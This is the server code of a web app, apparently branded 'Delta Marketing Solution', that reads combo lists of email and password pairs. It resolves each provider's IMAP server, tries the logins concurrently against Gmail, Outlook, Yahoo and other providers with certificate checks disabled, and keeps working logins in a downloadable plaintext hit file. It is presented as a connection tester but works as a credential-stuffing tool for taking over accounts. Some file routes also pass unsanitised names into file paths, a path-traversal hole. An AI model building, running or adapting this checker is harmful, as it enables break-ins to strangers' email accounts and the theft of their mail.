import express from "express";
import path from "path";
import fs from "fs";
import net from "net";
import tls from "tls";
import { createServer as createViteServer } from "vite";

const app = express();
const PORT = 3000;

app.use(express.json());

// Directories config
let scanFolder = path.join(process.cwd(), "scans");

// Ensure scans directory exists and create a demo file on startup
if (!fs.existsSync(scanFolder)) {
  fs.mkdirSync(scanFolder, { recursive: true });
}

// IMAP Provider auto-resolving settings
interface ImapProvider {
  domain: string;
  host: string;
  port: number;
  security: string;
}

let imapProviders: Record<string, ImapProvider> = {};
const PROVIDERS_FILE = path.join(process.cwd(), "imap_providers.txt");

function loadProviders() {
  const providers: Record<string, ImapProvider> = {};
  
  // Hardcoded defaults as a robust safety net
  const defaults: ImapProvider[] = [
    { domain: "gmail.com", host: "imap.gmail.com", port: 993, security: "SSL/TLS" },
    { domain: "googlemail.com", host: "imap.gmail.com", port: 993, security: "SSL/TLS" },
    { domain: "outlook.com", host: "imap-mail.outlook.com", port: 993, security: "SSL/TLS" },
    { domain: "hotmail.com", host: "imap-mail.outlook.com", port: 993, security: "SSL/TLS" },
    { domain: "hotmail.fr", host: "imap-mail.outlook.com", port: 993, security: "SSL/TLS" },
    { domain: "live.com", host: "imap-mail.outlook.com", port: 993, security: "SSL/TLS" },
    { domain: "live.fr", host: "imap-mail.outlook.com", port: 993, security: "SSL/TLS" },
    { domain: "msn.com", host: "imap-mail.outlook.com", port: 993, security: "SSL/TLS" },
    { domain: "office365.com", host: "outlook.office365.com", port: 993, security: "SSL/TLS" },
    { domain: "yahoo.com", host: "imap.mail.yahoo.com", port: 993, security: "SSL/TLS" },
    { domain: "yahoo.fr", host: "imap.mail.yahoo.com", port: 993, security: "SSL/TLS" },
    { domain: "ymail.com", host: "imap.mail.yahoo.com", port: 993, security: "SSL/TLS" },
    { domain: "sfr.fr", host: "imap.sfr.fr", port: 993, security: "SSL/TLS" },
    { domain: "neuf.fr", host: "imap.sfr.fr", port: 993, security: "SSL/TLS" },
    { domain: "club-internet.fr", host: "imap.sfr.fr", port: 993, security: "SSL/TLS" },
    { domain: "numericable.fr", host: "imap.sfr.fr", port: 993, security: "SSL/TLS" },
    { domain: "web.de", host: "imap.web.de", port: 993, security: "SSL/TLS" },
    { domain: "gmx.de", host: "imap.gmx.net", port: 993, security: "SSL/TLS" },
    { domain: "gmx.net", host: "imap.gmx.net", port: 993, security: "SSL/TLS" },
    { domain: "talktalk.net", host: "mail.talktalk.net", port: 993, security: "SSL/TLS" },
    { domain: "talktalk.co.uk", host: "mail.talktalk.net", port: 993, security: "SSL/TLS" },
    { domain: "tiscali.co.uk", host: "imap.tiscali.co.uk", port: 993, security: "SSL/TLS" },
    { domain: "earthlink.net", host: "imap.earthlink.net", port: 993, security: "SSL/TLS" },
    { domain: "mindspring.com", host: "imap.earthlink.net", port: 993, security: "SSL/TLS" },
    { domain: "orange.fr", host: "imap.orange.fr", port: 993, security: "SSL/TLS" },
    { domain: "free.fr", host: "imap.free.fr", port: 993, security: "SSL/TLS" },
    { domain: "laposte.net", host: "imap.laposte.net", port: 993, security: "SSL/TLS" },
    { domain: "mail.ru", host: "imap.mail.ru", port: 993, security: "SSL/TLS" },
    { domain: "yandex.ru", host: "imap.yandex.ru", port: 993, security: "SSL/TLS" },
    { domain: "icloud.com", host: "imap.mail.me.com", port: 993, security: "SSL/TLS" }
  ];

  defaults.forEach(d => {
    providers[d.domain] = d;
  });

  try {
    if (fs.existsSync(PROVIDERS_FILE)) {
      const content = fs.readFileSync(PROVIDERS_FILE, "utf8");
      const lines = content.split(/\r?\n/);
      for (let i = 1; i < lines.length; i++) {
        const line = lines[i].trim();
        if (!line || line.startsWith("#")) continue;
        const parts = line.split("|").map(s => s.trim());
        if (parts.length >= 4) {
          const domain = parts[0].toLowerCase();
          const host = parts[1];
          const port = parseInt(parts[2]) || 993;
          const security = parts[3];
          providers[domain] = { domain, host, port, security };
        }
      }
    } else {
      // Create it with our default list
      let fileContent = "domain|host|port|security\n";
      defaults.forEach(d => {
        fileContent += `${d.domain}|${d.host}|${d.port}|${d.security}\n`;
      });
      fs.writeFileSync(PROVIDERS_FILE, fileContent, "utf8");
    }
  } catch (e) {
    console.error("Failed to load/create imap_providers.txt:", e);
  }
  imapProviders = providers;
}

// Load providers on startup
loadProviders();

function getImapConfigForDomain(domain: string): { host: string; port: number; secure: boolean } {
  const key = domain.toLowerCase().trim();
  if (imapProviders[key]) {
    const prov = imapProviders[key];
    return {
      host: prov.host,
      port: prov.port,
      secure: prov.security.toUpperCase().includes("SSL") || prov.security.toUpperCase().includes("TLS") || prov.port === 993
    };
  }
  // Guess based on standard convention
  return {
    host: `imap.${domain}`,
    port: 993,
    secure: true
  };
}

// Create demo credentials file if folder is empty
const demoFilePath = path.join(scanFolder, "demo_credentials.txt");
if (!fs.existsSync(demoFilePath)) {
  const demoContent = `# Delta Marketing Solution - Demo IMAP Credentials File
# Lines starting with # are comments and ignored.
# Supports formats:
# 1) user:pass (guesses host and port automatically from settings database)
# 2) host:port:user:pass (explicit format fallback)

demo_user1@gmail.com:securepass123
delta_test_acc@sfr.fr:pass456
marketing_delta@web.de:MySecretPass789
delta-auth@talktalk.net:companypassword
`;
  fs.writeFileSync(demoFilePath, demoContent, "utf8");
}

// Memory stores
interface Credential {
  host: string;
  port: number;
  user: string;
  pass: string;
  secure: boolean;
  rawLine: string;
  lineNum: number;
  sourceFile: string;
}

interface AttemptLog {
  id: string;
  timestamp: string;
  host: string;
  port: number;
  user: string;
  status: "success" | "failed" | "testing";
  message: string;
  sourceFile: string;
}

let attemptLogs: AttemptLog[] = [];
const LOG_FILE = path.join(process.cwd(), "connection_attempts.json");
const SUCCESS_FILE = path.join(scanFolder, "successful_imap.txt");

// Load existing logs from file
try {
  if (fs.existsSync(LOG_FILE)) {
    const data = fs.readFileSync(LOG_FILE, "utf8");
    attemptLogs = JSON.parse(data);
  }
} catch (e) {
  console.error("Failed to load existing logs, starting fresh:", e);
}

// Helper to save global logs
function saveLogsToFile() {
  try {
    fs.writeFileSync(LOG_FILE, JSON.stringify(attemptLogs.slice(0, 1000), null, 2), "utf8");
  } catch (e) {
    console.error("Failed to write logs to file:", e);
  }
}

// Helper to add a global log entry
function addGlobalLog(cred: Partial<Credential>, status: "success" | "failed" | "testing", message: string) {
  const log: AttemptLog = {
    id: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    timestamp: new Date().toISOString(),
    host: cred.host || "unknown",
    port: cred.port || 993,
    user: cred.user || "unknown",
    status,
    message,
    sourceFile: cred.sourceFile ? path.basename(cred.sourceFile) : "direct-test",
  };
  attemptLogs.unshift(log);
  if (attemptLogs.length > 2000) {
    attemptLogs = attemptLogs.slice(0, 2000);
  }
  saveLogsToFile();
}

// Helper to save successful credential to successful_imap.txt
async function saveSuccessfulCred(cred: Credential) {
  try {
    const formatted = `${cred.host}:${cred.port}:${cred.user}:${cred.pass}\n`;
    
    // Check if it already exists in the file to prevent duplicates
    let fileContent = "";
    if (fs.existsSync(SUCCESS_FILE)) {
      fileContent = fs.readFileSync(SUCCESS_FILE, "utf8");
    }

    const searchStr = `${cred.host}:${cred.port}:${cred.user}:${cred.pass}`;
    if (!fileContent.includes(searchStr)) {
      fs.appendFileSync(SUCCESS_FILE, formatted, "utf8");
    }
  } catch (e) {
    console.error("Failed to save successful credential:", e);
  }
}

// IMAP Test Socket function
function testImapConnection(config: {
  host: string;
  port: number;
  user: string;
  pass: string;
  secure: boolean;
  timeout?: number;
}): Promise<{ success: boolean; message: string }> {
  return new Promise((resolve) => {
    const timeoutMs = config.timeout || 10000;
    let socket: any;
    let resolved = false;
    let buffer = "";

    const cleanup = () => {
      resolved = true;
      if (socket) {
        socket.destroy();
      }
    };

    const timer = setTimeout(() => {
      if (!resolved) {
        cleanup();
        resolve({ success: false, message: "Connection timeout after " + (timeoutMs / 1000) + "s" });
      }
    }, timeoutMs);

    const onData = (data: Buffer) => {
      buffer += data.toString("utf8");
      
      // Wait for server greeting (usually starts with * OK)
      if (buffer.includes("* OK")) {
        // Send login command
        const safeUser = config.user.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
        const safePass = config.pass.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
        socket.write(`A1 LOGIN "${safeUser}" "${safePass}"\r\n`);
        buffer = ""; // clear buffer to wait for login response
      } else if (buffer.includes("A1 OK")) {
        socket.write("A2 LOGOUT\r\n");
        cleanup();
        clearTimeout(timer);
        resolve({ success: true, message: "Authentication successful" });
      } else if (buffer.includes("A1 NO") || buffer.includes("A1 BAD")) {
        // Extract server error if possible
        const lines = buffer.split("\r\n");
        const match = lines.find(l => l.includes("A1 NO") || l.includes("A1 BAD"));
        const errorMsg = match ? match : "Invalid username or password";
        cleanup();
        clearTimeout(timer);
        resolve({ success: false, message: errorMsg });
      }
    };

    try {
      if (config.secure) {
        socket = tls.connect({
          host: config.host,
          port: config.port,
          rejectUnauthorized: false, // Bypass self-signed / invalid SSL checks for testing flexibility
          timeout: timeoutMs
        }, () => {
          // SSL Connection complete, wait for greeting
        });
      } else {
        socket = net.connect({
          host: config.host,
          port: config.port
        }, () => {
          // Plain Connection complete, wait for greeting
        });
        socket.setTimeout(timeoutMs);
      }

      socket.on("data", onData);

      socket.on("error", (err: any) => {
        if (!resolved) {
          cleanup();
          clearTimeout(timer);
          resolve({ success: false, message: `${err.code || "SocketError"}: ${err.message}` });
        }
      });

      socket.on("timeout", () => {
        if (!resolved) {
          cleanup();
          clearTimeout(timer);
          resolve({ success: false, message: "Socket read/write timeout" });
        }
      });

      socket.on("close", () => {
        if (!resolved) {
          cleanup();
          clearTimeout(timer);
          resolve({ success: false, message: "Connection closed unexpectedly by server" });
        }
      });

    } catch (err: any) {
      if (!resolved) {
        cleanup();
        clearTimeout(timer);
        resolve({ success: false, message: `Setup error: ${err.message}` });
      }
    }
  });
}

// Credentials line parser
function parseCredentialLine(line: string, sourceFile: string, lineNum: number): Credential | null {
  const trimmed = line.trim();
  if (!trimmed || trimmed.startsWith("#") || trimmed.startsWith("//")) {
    return null;
  }

  // Define potential delimiters in order of preference
  const delimiters = ["|", ";", "\t", ",", ":"];
  let chosenDelim = "";
  
  for (const delim of delimiters) {
    if (trimmed.includes(delim)) {
      chosenDelim = delim;
      break;
    }
  }

  if (!chosenDelim) {
    return null;
  }

  let host = "";
  let port = 993;
  let user = "";
  let pass = "";
  let secure = true;

  // Let's check if we can parse it as user:pass where user is an email.
  // We locate the FIRST occurrence of chosenDelim.
  const firstDelimIdx = trimmed.indexOf(chosenDelim);
  const partBefore = trimmed.slice(0, firstDelimIdx).trim();
  const partAfter = trimmed.slice(firstDelimIdx + 1).trim();

  // If partBefore is an email address (contains "@"), we parse as email:pass
  if (partBefore.includes("@") && !partBefore.includes(" ")) {
    user = partBefore;
    pass = partAfter;
    
    // Auto-lookup settings based on the email domain
    const domain = user.split("@")[1].toLowerCase();
    const config = getImapConfigForDomain(domain);
    host = config.host;
    port = config.port;
    secure = config.secure;
  } else {
    // If it's not email:pass, we split all parts to check for other formats
    const allParts = trimmed.split(chosenDelim).map(s => s.trim());
    
    if (allParts.length === 2) {
      user = allParts[0];
      pass = allParts[1];
      if (user.includes("@")) {
        const domain = user.split("@")[1].toLowerCase();
        const config = getImapConfigForDomain(domain);
        host = config.host;
        port = config.port;
        secure = config.secure;
      } else {
        host = "imap.localhost";
        port = 993;
        secure = true;
      }
    } else if (allParts.length === 3) {
      // Could be host:user:pass OR user:pass:host
      if (allParts[0].includes("@")) {
        // user:pass:host
        user = allParts[0];
        pass = allParts[1];
        host = allParts[2];
        const domain = user.split("@")[1].toLowerCase();
        const config = getImapConfigForDomain(domain);
        port = config.port;
        secure = config.secure;
      } else if (allParts[1].includes("@")) {
        // host:user:pass
        host = allParts[0];
        user = allParts[1];
        pass = allParts[2];
        const domain = user.split("@")[1].toLowerCase();
        const config = getImapConfigForDomain(domain);
        port = config.port;
        secure = config.secure;
      } else {
        // Default fallback
        host = allParts[0];
        user = allParts[1];
        pass = allParts[2];
        port = 993;
        secure = true;
      }
    } else if (allParts.length >= 4) {
      // Check for host:port:user:pass or user:pass:host:port
      const part1Num = parseInt(allParts[1]);
      const part3Num = parseInt(allParts[3]);

      if (!isNaN(part1Num) && part1Num > 0 && part1Num < 65536) {
        // host:port:user:pass
        host = allParts[0];
        port = part1Num;
        user = allParts[2];
        
        let count = 0;
        let thirdDelimIdx = -1;
        for (let i = 0; i < trimmed.length; i++) {
          if (trimmed[i] === chosenDelim) {
            count++;
            if (count === 3) {
              thirdDelimIdx = i;
              break;
            }
          }
        }
        pass = thirdDelimIdx !== -1 ? trimmed.slice(thirdDelimIdx + 1).trim() : allParts[3];
        secure = port === 993 || port === 465 || port === 995;
      } else if (!isNaN(part3Num) && part3Num > 0 && part3Num < 65536) {
        // user:pass:host:port
        user = allParts[0];
        pass = allParts[1];
        host = allParts[2];
        port = part3Num;
        secure = port === 993 || port === 465 || port === 995;
      } else {
        if (allParts[0].includes("@")) {
          user = allParts[0];
          pass = partAfter;
          const domain = user.split("@")[1].toLowerCase();
          const config = getImapConfigForDomain(domain);
          host = config.host;
          port = config.port;
          secure = config.secure;
        } else {
          host = allParts[0];
          user = allParts[1];
          pass = allParts[2];
          port = 993;
          secure = true;
        }
      }
    }
  }

  if (!host || !user || !pass) {
    return null;
  }

  return {
    host,
    port,
    user,
    pass,
    secure,
    rawLine: trimmed,
    lineNum,
    sourceFile
  };
}

// Bulk test task state
interface BulkTask {
  active: boolean;
  fileName: string;
  filePath: string;
  total: number;
  checked: number;
  successCount: number;
  failureCount: number;
  concurrency: number;
  startTime: number | null;
  endTime: number | null;
  logs: string[];
  currentIndex: number;
}

let bulkTask: BulkTask = {
  active: false,
  fileName: "",
  filePath: "",
  total: 0,
  checked: 0,
  successCount: 0,
  failureCount: 0,
  concurrency: 5,
  startTime: null,
  endTime: null,
  logs: [],
  currentIndex: 0,
};

// Start bulk testing in background
async function runBulkTest(fileCredentials: Credential[]) {
  bulkTask.active = true;
  bulkTask.startTime = Date.now();
  bulkTask.endTime = null;
  bulkTask.total = fileCredentials.length;
  bulkTask.checked = 0;
  bulkTask.successCount = 0;
  bulkTask.failureCount = 0;
  bulkTask.currentIndex = 0;
  bulkTask.logs = [`[${new Date().toLocaleTimeString()}] Bulk test started for ${fileCredentials.length} accounts with concurrency ${bulkTask.concurrency}`];

  const worker = async () => {
    while (bulkTask.active && bulkTask.currentIndex < fileCredentials.length) {
      const idx = bulkTask.currentIndex++;
      const cred = fileCredentials[idx];
      if (!cred) continue;

      const logMsg = (msg: string) => {
        const timestamp = new Date().toLocaleTimeString();
        const formatted = `[${timestamp}] [Line ${cred.lineNum}] ${cred.user}@${cred.host} -> ${msg}`;
        bulkTask.logs.unshift(formatted);
        if (bulkTask.logs.length > 500) bulkTask.logs.pop();
      };

      try {
        const result = await testImapConnection({
          host: cred.host,
          port: cred.port,
          user: cred.user,
          pass: cred.pass,
          secure: cred.secure,
          timeout: 8000
        });

        if (!bulkTask.active) break;

        if (result.success) {
          bulkTask.successCount++;
          logMsg("SUCCESS: Auth OK");
          addGlobalLog(cred, "success", "Authentication successful (Bulk check)");
          await saveSuccessfulCred(cred);
        } else {
          bulkTask.failureCount++;
          logMsg(`FAILED: ${result.message}`);
          addGlobalLog(cred, "failed", `${result.message} (Bulk check)`);
        }
      } catch (err: any) {
        bulkTask.failureCount++;
        logMsg(`ERROR: ${err.message}`);
        addGlobalLog(cred, "failed", `Error: ${err.message}`);
      }

      bulkTask.checked++;
    }
  };

  const workers = [];
  const count = Math.min(bulkTask.concurrency, fileCredentials.length);
  for (let i = 0; i < count; i++) {
    workers.push(worker());
  }

  await Promise.all(workers);
  bulkTask.active = false;
  bulkTask.endTime = Date.now();
  bulkTask.logs.unshift(`[${new Date().toLocaleTimeString()}] Bulk test finished. Tested: ${bulkTask.checked}, Success: ${bulkTask.successCount}, Failed: ${bulkTask.failureCount}`);
}

// API Routes
app.get("/api/scan-config", (req, res) => {
  res.json({
    scanFolder,
    successFile: SUCCESS_FILE,
    exists: fs.existsSync(scanFolder)
  });
});

app.post("/api/scan-config", (req, res) => {
  const { folder } = req.body;
  if (!folder) {
    return res.status(400).json({ error: "Folder path is required" });
  }

  const absolutePath = path.isAbsolute(folder) ? folder : path.join(process.cwd(), folder);
  try {
    if (!fs.existsSync(absolutePath)) {
      fs.mkdirSync(absolutePath, { recursive: true });
    }
    scanFolder = absolutePath;
    res.json({ success: true, scanFolder, successFile: SUCCESS_FILE });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to set folder: ${err.message}` });
  }
});

// Auto IMAP setting lookup route
app.get("/api/lookup-imap", (req, res) => {
  const { q } = req.query;
  if (!q || typeof q !== "string") {
    return res.status(400).json({ error: "Query parameter 'q' (email or domain) is required" });
  }

  let domain = q.toLowerCase().trim();
  if (domain.includes("@")) {
    domain = domain.split("@")[1];
  }

  const config = getImapConfigForDomain(domain);
  const isCustom = !!imapProviders[domain];
  res.json({
    domain,
    host: config.host,
    port: config.port,
    secure: config.secure,
    security: isCustom ? imapProviders[domain].security : (config.port === 993 ? "SSL/TLS" : "STARTTLS"),
    isCustom
  });
});

// Get loaded IMAP domain list
app.get("/api/imap-providers", (req, res) => {
  res.json({ providers: imapProviders });
});

// Create/Update IMAP domain setting
app.post("/api/imap-providers", (req, res) => {
  const { domain, host, port, security } = req.body;
  if (!domain || !host || !port || !security) {
    return res.status(400).json({ error: "domain, host, port, and security are required" });
  }

  const cleanDomain = domain.toLowerCase().trim();
  imapProviders[cleanDomain] = {
    domain: cleanDomain,
    host: host.trim(),
    port: parseInt(port),
    security: security.trim()
  };

  try {
    // Write back to file
    let fileContent = "domain|host|port|security\n";
    Object.values(imapProviders).forEach(d => {
      fileContent += `${d.domain}|${d.host}|${d.port}|${d.security}\n`;
    });
    fs.writeFileSync(PROVIDERS_FILE, fileContent, "utf8");
    res.json({ success: true, providers: imapProviders });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to save provider: ${err.message}` });
  }
});

// List files in directory
app.get("/api/files", (req, res) => {
  try {
    if (!fs.existsSync(scanFolder)) {
      return res.json({ files: [] });
    }

    const files = fs.readdirSync(scanFolder);
    const result = [];

    for (const file of files) {
      const fullPath = path.join(scanFolder, file);
      const stat = fs.statSync(fullPath);

      if (stat.isFile() && (file.endsWith(".txt") || file.endsWith(".csv") || file.endsWith(".log") || file.endsWith(".ini"))) {
        // Count estimated lines
        const content = fs.readFileSync(fullPath, "utf8");
        const lines = content.split(/\r?\n/);
        let parsedCount = 0;
        
        lines.forEach((line, idx) => {
          if (parseCredentialLine(line, file, idx + 1)) {
            parsedCount++;
          }
        });

        result.push({
          name: file,
          size: stat.size,
          modified: stat.mtime,
          totalLines: lines.length,
          parsedCount
        });
      }
    }

    res.json({ files: result });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to list files: ${err.message}` });
  }
});

// Get parsed preview from file
app.get("/api/file-preview", (req, res) => {
  const { name } = req.query;
  if (!name || typeof name !== "string") {
    return res.status(400).json({ error: "File name is required" });
  }

  const filePath = path.join(scanFolder, name);
  try {
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: "File not found" });
    }

    const content = fs.readFileSync(filePath, "utf8");
    const lines = content.split(/\r?\n/);
    const parsed: Credential[] = [];

    lines.forEach((line, idx) => {
      const cred = parseCredentialLine(line, name, idx + 1);
      if (cred) {
        parsed.push(cred);
      }
    });

    res.json({
      name,
      totalLines: lines.length,
      credentialsCount: parsed.length,
      preview: parsed.slice(0, 100) // limit preview to first 100 items
    });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to read file: ${err.message}` });
  }
});

// Create new file directly in scanned folder
app.post("/api/create-file", (req, res) => {
  const { name, content } = req.body;
  if (!name || !content) {
    return res.status(400).json({ error: "File name and content are required" });
  }

  const safeName = path.basename(name);
  const filePath = path.join(scanFolder, safeName);

  try {
    fs.writeFileSync(filePath, content, "utf8");
    res.json({ success: true, message: `File ${safeName} created successfully` });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to create file: ${err.message}` });
  }
});

// Delete file
app.delete("/api/files", (req, res) => {
  const { name } = req.query;
  if (!name || typeof name !== "string") {
    return res.status(400).json({ error: "File name is required" });
  }

  const filePath = path.join(scanFolder, path.basename(name));
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      res.json({ success: true, message: "File deleted" });
    } else {
      res.status(404).json({ error: "File not found" });
    }
  } catch (err: any) {
    res.status(500).json({ error: `Failed to delete file: ${err.message}` });
  }
});

// Single connection tester
app.post("/api/test-single", async (req, res) => {
  const { host, port, user, pass, secure, timeout } = req.body;

  if (!host || !port || !user || !pass) {
    return res.status(400).json({ error: "Host, port, username, and password are required" });
  }

  const cred = { host, port: parseInt(port), user, pass, secure: !!secure, rawLine: "", lineNum: 0, sourceFile: "direct-test" };

  addGlobalLog(cred, "testing", "Direct connection attempt started");

  try {
    const result = await testImapConnection({
      host,
      port: parseInt(port),
      user,
      pass,
      secure: !!secure,
      timeout: timeout ? parseInt(timeout) : 10000
    });

    if (result.success) {
      addGlobalLog(cred, "success", "Direct connection succeeded: Auth OK");
      await saveSuccessfulCred({ ...cred, rawLine: `${host}:${port}:${user}:${pass}` });
      res.json({ success: true, message: result.message });
    } else {
      addGlobalLog(cred, "failed", `Direct connection failed: ${result.message}`);
      res.json({ success: false, message: result.message });
    }
  } catch (err: any) {
    addGlobalLog(cred, "failed", `Direct connection error: ${err.message}`);
    res.json({ success: false, message: err.message });
  }
});

// Start bulk test run
app.post("/api/test-bulk-start", (req, res) => {
  const { fileName, concurrency } = req.body;
  if (!fileName) {
    return res.status(400).json({ error: "File name is required" });
  }

  if (bulkTask.active) {
    return res.status(400).json({ error: "A bulk test run is already active" });
  }

  const filePath = path.join(scanFolder, fileName);
  try {
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: "Credentials file not found" });
    }

    const content = fs.readFileSync(filePath, "utf8");
    const lines = content.split(/\r?\n/);
    const credentials: Credential[] = [];

    lines.forEach((line, idx) => {
      const cred = parseCredentialLine(line, fileName, idx + 1);
      if (cred) {
        credentials.push(cred);
      }
    });

    if (credentials.length === 0) {
      return res.status(400).json({ error: "No valid credentials found in this file" });
    }

    bulkTask.fileName = fileName;
    bulkTask.filePath = filePath;
    bulkTask.concurrency = concurrency ? Math.min(Math.max(1, parseInt(concurrency)), 50) : 5;

    // Start asynchronously
    runBulkTest(credentials);

    res.json({ success: true, message: `Bulk test started with ${credentials.length} accounts` });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to start bulk test: ${err.message}` });
  }
});

// Stop current bulk test run
app.post("/api/test-bulk-stop", (req, res) => {
  if (!bulkTask.active) {
    return res.json({ message: "No active bulk test to stop" });
  }

  bulkTask.active = false;
  bulkTask.logs.unshift(`[${new Date().toLocaleTimeString()}] Bulk test canceled by user.`);
  res.json({ success: true, message: "Bulk test run canceled" });
});

// Bulk test status
app.get("/api/test-bulk-status", (req, res) => {
  res.json(bulkTask);
});

// Retrieve connection logs
app.get("/api/logs", (req, res) => {
  res.json({ logs: attemptLogs });
});

// Clear logs
app.post("/api/logs/clear", (req, res) => {
  attemptLogs = [];
  saveLogsToFile();
  res.json({ success: true });
});

// Retrieve successful validated accounts
app.get("/api/successes", (req, res) => {
  try {
    if (!fs.existsSync(SUCCESS_FILE)) {
      return res.json({ successes: [] });
    }

    const content = fs.readFileSync(SUCCESS_FILE, "utf8");
    const lines = content.split(/\r?\n/).filter(line => line.trim() !== "");
    const parsed = lines.map((line, idx) => {
      const parts = line.split(":");
      return {
        id: `suc-${idx}`,
        host: parts[0] || "",
        port: parseInt(parts[1]) || 993,
        user: parts[2] || "",
        pass: parts[3] || "",
        rawLine: line
      };
    });

    res.json({ successes: parsed });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to read successes: ${err.message}` });
  }
});

// Download successes list directly
app.get("/api/download-successes", (req, res) => {
  try {
    if (!fs.existsSync(SUCCESS_FILE)) {
      res.setHeader("Content-Disposition", "attachment; filename=successful_imap.txt");
      res.setHeader("Content-Type", "text/plain");
      return res.send("");
    }

    res.setHeader("Content-Disposition", "attachment; filename=successful_imap.txt");
    res.setHeader("Content-Type", "text/plain");
    const fileStream = fs.createReadStream(SUCCESS_FILE);
    fileStream.pipe(res);
  } catch (err: any) {
    res.status(500).send(`Error downloading file: ${err.message}`);
  }
});

// Clear successful list
app.post("/api/successes/clear", (req, res) => {
  try {
    if (fs.existsSync(SUCCESS_FILE)) {
      fs.writeFileSync(SUCCESS_FILE, "", "utf8");
    }
    res.json({ success: true });
  } catch (err: any) {
    res.status(500).json({ error: `Failed to clear successes: ${err.message}` });
  }
});

// Create Vite server for Dev Mode
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
